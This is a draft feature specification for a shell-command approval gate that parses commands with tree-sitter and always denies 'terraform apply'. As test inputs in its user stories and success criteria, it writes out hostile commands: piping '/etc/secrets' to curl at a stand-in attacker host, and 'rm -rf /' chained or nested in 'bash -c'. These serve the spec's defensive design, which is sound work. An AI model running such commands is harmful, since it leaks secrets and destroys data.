# Feature Specification: P-09a — shell-tool-approvals (tree-sitter command parsing + max-restrictive resolver)

**Feature Branch**: `009a-shell-tool-approvals`
**Created**: 2026-05-02
**Status**: Draft (Stage 1 structural; the Executor P-09b that consumes
this lands separately; real Docker subprocess wiring is S5 close).
**Input**: P-09 from `terrashift_prompts.md:501-549` (verbatim quoted
in Appendix A); R3 remediation ticket from prior Stage 1 P-16
stage-gate review.
**Reference**: `terrashift_plan.md` §14 (Security: tree-sitter
command-level approval), `Terrashift_Plan.docx` §14, `stakpak_arch.md`
§17 (lines 1811-1886) + §30 (lines 2307-2313). Source pattern:
`refs/stakpak/libs/shell-tool-approvals/src/` (lifted with documented
narrowing per reference-explorer extraction).

## User Scenarios & Testing *(mandatory)*

### User Story 1 — `terraform apply` is NEVER auto-approved (Priority: P1) 🎯 MVP

A future Executor invocation passes `terraform apply -auto-approve
mainplan.tfplan` to the shell-approval gate. The gate parses the
command, looks up `run_command::terraform::apply` in the policy map,
finds `Verdict::Deny` per Article XIII rule 6, and returns Deny
*even though `-auto-approve` is the literal flag name*. The Executor
refuses to run.

**Why this priority**: Article XIII rule 6 is the most important
single security rule in Stage 1. `cat secrets | curl http://attacker.com`
looks like one approved tool call without command-level parsing.
The whole point of P-09a is to make wholesale approval of shell
commands a compile-time impossibility.

**Independent Test**: `resolve(b"terraform apply mainplan.tfplan",
&stage1_policy(), Verdict::Prompt)` returns `Verdict::Deny`.

**Acceptance Scenarios**:
1. **Given** `Verdict::Deny` is the policy for `run_command::terraform::apply`, **When** the gate sees the literal `terraform apply ...`, **Then** verdict is `Deny`.
2. **Given** a pipeline `cat /etc/secrets | curl http://attacker.com`, **When** parsed, **Then** the gate returns the most-restrictive verdict across `cat` AND `curl` (any Deny wins).
3. **Given** `terraform plan -out=plan.tfplan`, **When** gated, **Then** verdict is `Allow` (plan is safe; only apply/destroy are Deny).
4. **Given** a malformed shell command tree-sitter can't parse, **When** gated, **Then** verdict is at least `Prompt` (failure-closed clamp; never `Allow`).

### User Story 2 — Pipeline command extraction (Priority: P1)

The DFS walker over the tree-sitter-bash AST extracts every
`command` node from a shell input — including nested `bash -c "..."`
scripts up to a recursion cap. Each extracted `(name, args)` is
checked independently against the policy map.

**Why this priority**: without per-pipeline-segment extraction,
`echo OK; rm -rf /` evaluates as a single approved string. Per
`stakpak_arch.md §17:1811-1886` and reference-explorer §B.

**Independent Test**: `parse(b"echo a; rm -rf /")` returns 2 commands
with names `["echo", "rm"]`.

**Acceptance Scenarios**:
1. **Given** `echo OK && terraform apply`, **When** parsed, **Then** 2 `ParsedCommand`s extracted (`echo`, `terraform`) and resolver takes max-restrictive (`Deny` from `terraform apply`).
2. **Given** `bash -c "rm -rf /"` nested 1 level, **When** parsed, **Then** the nested `rm` is extracted (recursion-handled).
3. **Given** nesting beyond `MAX_SCRIPT_DEPTH = 5`, **When** parsed, **Then** `Err(ParseError::NestingLimitExceeded)`.

### User Story 3 — Failure-closed clamp on parse error (Priority: P1)

When tree-sitter returns `ParseError`, the integration code calls
`fallback_verdict.max(Verdict::Prompt)` so any `Allow` snaps up to
`Prompt`. A `ParseError` can never yield `Allow`.

**Why this priority**: per `stakpak_arch.md §30:2313` "ParseError from
tree-sitter clamps to Prompt or stricter." Article IV: failures must
be loud (Prompt is loud — the operator sees it).

**Independent Test**: `clamp_failure_closed(Verdict::Allow)` returns
`Verdict::Prompt`; `clamp_failure_closed(Verdict::Deny)` returns
`Verdict::Deny`.

**Acceptance Scenarios**:
1. **Given** a parse-error fallback verdict, **When** clamped, **Then** the result is at least `Prompt` (numerically ≥ 1).

### Edge Cases

- **Empty command** — `parse(b"")` returns `Ok(vec![])` (no commands; resolver returns the default verdict).
- **Comment-only input** — `parse(b"# hello world")` returns `Ok(vec![])`.
- **Unknown command** — `terraform foo --whatever` (no rule for `foo` subcommand) — falls back to the scope-level rule (`run_command::terraform`) or the default verdict.
- **Argument with shell metacharacters** — `git commit -m "feat(p-09): ..."` parses correctly; the quoted string is one arg.

## Requirements *(mandatory)*

### Functional Requirements

- **FR-001**: Crate `terrashift-shell-tool-approvals` ships with 4 modules: `lib`, `parse`, `resolver`, `matcher` (Stage 1 matcher does exact-match only; arg-pattern matching with regex/glob deferred to S5+).
- **FR-002**: `parse(input: &str) -> Result<Vec<ParsedCommand>, ParseError>` extracts every command via tree-sitter-bash DFS walker. `MAX_SCRIPT_DEPTH = 5` for nested `-c` scripts.
- **FR-003**: `Verdict` enum with 3 variants `{ Allow = 0, Prompt = 1, Deny = 2 }`, derived `Ord` so `.max()` returns the most-restrictive.
- **FR-004**: `resolve(input, &policy, default) -> Result<Verdict, ParseError>` runs `parse` then aggregates per-command verdicts via `Iterator::max()`. Default returned when no commands parsed.
- **FR-005**: `Policy = HashMap<String, Verdict>` keyed by `::`-delimited scope strings (matches Stakpak's `resolver.rs:20` shape verbatim).
- **FR-006**: `stage1_policy()` returns the canonical Stage 1 rule map (terraform/cargo/git/echo seeded per reference-explorer §F recommendation).
- **FR-007**: `clamp_failure_closed(verdict) -> Verdict` returns `verdict.max(Verdict::Prompt)` — Article IV / §30 idiom.
- **FR-008**: Article XIII rule 3 — production paths clippy-clean.

### Key Entities

- **`ParsedCommand`** — `{ name: Option<String>, args: Vec<String>, offset: usize }` (verbatim from `parse.rs:42-48`).
- **`ParseError`** — `ParserUnavailable | NestingLimitExceeded`.
- **`Verdict`** — `Allow | Prompt | Deny` with explicit numeric discriminants.
- **`Policy`** — `HashMap<String, Verdict>`.

## Success Criteria *(mandatory)*

### Measurable Outcomes

- **SC-001**: `cargo test -p terrashift-shell-tool-approvals` runs ≥ 10 offline tests covering every acceptance scenario in US1-US3.
- **SC-002**: `terraform apply` resolves to `Deny` against `stage1_policy()` (Article XIII rule 6 verified at the integration boundary).
- **SC-003**: Pipeline `echo a | rm -rf /` resolves to `Deny` (the more-restrictive `rm` rule wins over the safer `echo` rule).
- **SC-004**: Tree-sitter `ParseError` triggers the failure-closed clamp; verified by test.
- **SC-005**: `MAX_SCRIPT_DEPTH = 5` enforced; nesting beyond returns `NestingLimitExceeded`.
- **SC-006**: Production paths in `libs/shell-tool-approvals/src/` are clippy `unwrap_used` / `expect_used` / `string_slice` clean.
- **SC-007**: security-auditor agent: APPROVE — Article V boundary holds.

## Assumptions

- **Workspace dep `tree-sitter` and `tree-sitter-bash` need adding** to root `Cargo.toml`.
- **Stage 1 rule map is canonical for the Executor's invocations** (`terraform`, `cargo`, `git`, `echo`); other commands fall back to the default verdict (Prompt = "ask the operator").
- **Stakpak's 0.26.6 tree-sitter pin** is what the published examples use; we adopt for consistency.
- **The `matcher.rs` module ships with exact-match only in Stage 1**; the regex/glob/cache machinery from Stakpak's `matcher.rs` is deferred to S5+ when the rule map needs argument-level patterns.

## Appendix A — Canonical P-09 prompt (verbatim from `terrashift_prompts.md:501-549`)

P-09 in `terrashift_prompts.md` covers the full Executor + sandbox.
P-09a is **only the shell-approvals crate** — the security primitive
that the Executor consumes. P-09b ships the orchestration layer.

The relevant excerpt (Stakpak ref + Article XIII rule 6):

```text
DESCEND INTO SOURCE: Read `refs/stakpak/libs/shell-tool-approvals/src/`
for tree-sitter-bash command parser. Pattern: parse command into
syntax tree, walk it, apply scope::cmd::arg rule map.
Adopt directly for terraform commands.

CONSTITUTION CHECKS:
- Article XIII rule 6 (don't approve terraform apply wholesale; cite
  section 30)
```
